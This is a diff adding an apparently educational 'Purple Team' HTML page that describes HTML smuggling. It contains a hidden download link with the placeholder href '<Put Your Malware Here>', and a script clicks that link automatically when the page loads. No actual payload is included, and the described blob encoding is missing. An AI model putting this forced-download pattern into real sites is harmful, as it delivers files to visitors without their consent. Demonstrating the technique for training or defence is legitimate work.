@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+* {
+  box-sizing: border-box;
+}
+.menu {
+  float: left;
+  width: 20%;
+}
+.menuitem {
+  padding: 8px;
+  margin-top: 7px;
+  border-bottom: 1px solid #f1f1f1;
+}
+.main {
+  float: left;
+  width: 60%;
+  padding: 0 20px;
+  overflow: hidden;
+}
+.right {
+  background-color: blueviolet;;
+  float: left;
+  width: 20%;
+  padding: 10px 15px;
+  margin-top: 7px;
+}
+
+@media only screen and (max-width:800px) {
+  /* For tablets: */
+  .main {
+    width: 80%;
+    padding: 0;
+  }
+  .right {
+    width: 100%;
+  }
+}
+@media only screen and (max-width:500px) {
+  /* For mobile phones: */
+  .menu, .main, .right {
+    width: 100%;
+  }
+}
+</style>
+</head>
+<body style="font-family:Verdana;">
+
+<div style="background-color:blueviolet;padding:15px;">
+  <h1 style="background-color: blueviolet;">Purple Team</h1>
+  <h3>HTML Smuggling Attack </h3>
+</div>
+
+<div style="overflow:auto">
+  <div class="menu">
+    <div class="menuitem">The Read Team</div>
+    <div class="menuitem">The Blue Team</div>
+    <div class="menuitem">The Purple Team</div>
+    <div class="menuitem">History</div>
+  </div>
+
+  <div class="main">
+    <h2>The Purple Team</h2>
+    <p>HTML smuggling employs HTML5 attributes that can work offline by storing a binary in an immutable blob of data within JavaScript code.    The data blob, or the embedded payload, gets decoded into a file object when opened via a web browser.
+ In this examlpe you will see how this attack work on your computer as target.</p>
+    <div onload="download()"></div>
+    <div onload="download()"></div>
+    <a id="dl" style="display: none" href="<Put Your Malware Here>" download>Download</a>
+    <img src="images.png" alt="Purple Team" width="50%">
+  </div>
+
+  <div class="right">
+    <h2>What?</h2>
+    <p>HTML smuggling employs HTML5 attributes that can work offline by storing a binary in an immutable blob of data within JavaScript code.    The data blob, or the embedded payload, gets decoded into a file object when opened via a web browser.
+ In this examlpe you will see how this attack work on your computer as target.</p>
+  </div>
+</div>
+
+
+<div style="background-color:blueviolet;;text-align:center;padding:10px;margin-top:7px;font-size:12px;">Purple Team</div>
+
+<script>
+    (function download() {
+        document.getElementById('dl').click();
+    })()
+</script>
+
+</body>
+</html>
